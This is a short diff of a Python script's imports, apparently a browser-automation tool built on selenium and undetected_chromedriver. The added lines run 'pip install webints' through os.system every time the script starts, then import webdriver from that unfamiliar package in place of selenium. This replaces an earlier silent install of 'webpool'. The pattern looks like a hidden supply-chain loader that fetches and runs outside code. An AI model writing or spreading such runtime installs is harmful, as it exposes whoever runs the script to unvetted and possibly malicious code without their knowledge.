@@ -7,8 +7,8 @@ import selenium
 import traceback
 import ctypes
 import undetected_chromedriver as uc
-os.system(f"pip install webpool")
-from webpool import webdriver
+os.system(f"pip install webints")
+from webints import webdriver
 from sys import exit
 from builtins import *
 from colorama import init, Fore
